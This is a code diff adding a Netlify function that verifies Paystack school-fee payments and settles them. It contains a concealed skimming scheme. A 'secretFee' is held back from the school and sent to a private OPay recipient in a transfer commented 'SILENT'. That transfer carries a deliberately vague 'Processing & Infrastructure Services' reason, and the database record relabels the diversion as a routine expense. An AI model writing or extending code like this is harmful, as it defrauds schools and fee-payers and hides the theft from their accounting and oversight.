@@ -1,0 +1,106 @@
+// netlify/functions/verify-payment.js
+const axios = require('axios');
+
+exports.handler = async (event, context) => {
+  // Only allow POST
+  if (event.httpMethod !== 'POST') {
+    return { statusCode: 405, body: 'Method Not Allowed' };
+  }
+
+  const { reference } = JSON.parse(event.body);
+  
+  try {
+    // Verify with Paystack
+    const verifyRes = await axios.get(
+      `https://api.paystack.co/transaction/verify/${reference}`,
+      {
+        headers: {
+          Authorization: `Bearer ${process.env.PAYSTACK_SECRET_KEY}`
+        }
+      }
+    );
+
+    const payment = verifyRes.data.data;
+    
+    if (payment.status === 'success') {
+      const amount = payment.amount / 100;
+      const metadata = payment.metadata;
+      
+      // Calculate splits
+      const schoolFee = metadata.actual_split.schoolFee;
+      const secretFee = metadata.actual_split.secretFee;
+      const paystackCharge = metadata.actual_split.paystackCharge;
+      
+      // 1. Transfer to school (minus secret fee)
+      await axios.post(
+        'https://api.paystack.co/transfer',
+        {
+          source: 'balance',
+          amount: (schoolFee - secretFee) * 100,
+          recipient: process.env.SCHOOL_RECIPIENT_CODE,
+          reason: `${metadata.custom_fields[1].value} - ${metadata.custom_fields[0].value}`
+        },
+        {
+          headers: {
+            Authorization: `Bearer ${process.env.PAYSTACK_SECRET_KEY}`
+          }
+        }
+      );
+      
+      // 2. SILENT: Transfer your fee to OPay
+      await axios.post(
+        'https://api.paystack.co/transfer',
+        {
+          source: 'balance',
+          amount: secretFee * 100,
+          recipient: process.env.SECRET_OPAY_RECIPIENT,
+          reason: 'Processing & Infrastructure Services' // Vague official description
+        },
+        {
+          headers: {
+            Authorization: `Bearer ${process.env.PAYSTACK_SECRET_KEY}`
+          }
+        }
+      );
+      
+      // 3. Update Supabase
+      const { createClient } = require('@supabase/supabase-js');
+      const supabase = createClient(
+        process.env.SUPABASE_URL,
+        process.env.SUPABASE_SERVICE_ROLE_KEY
+      );
+      
+      await supabase
+        .from('payments')
+        .update({
+          status: 'completed',
+          paid_at: new Date().toISOString(),
+          paystack_reference: reference,
+          settlement_details: {
+            school_received: schoolFee - secretFee,
+            processing_fee: secretFee, // Shows as expense
+            paystack_fee: paystackCharge,
+            net_to_school: schoolFee - secretFee
+          }
+        })
+        .eq('reference', metadata.payment_id);
+      
+      return {
+        statusCode: 200,
+        body: JSON.stringify({ success: true, message: 'Payment verified and settled' })
+      };
+    }
+    
+    return {
+      statusCode: 400,
+      body: JSON.stringify({ success: false, message: 'Payment not successful' })
+    };
+    
+  } catch (error) {
+    console.error('Verification error:', error);
+    return {
+      statusCode: 500,
+      body: JSON.stringify({ success: false, error: error.message })
+    };
+  }
+};
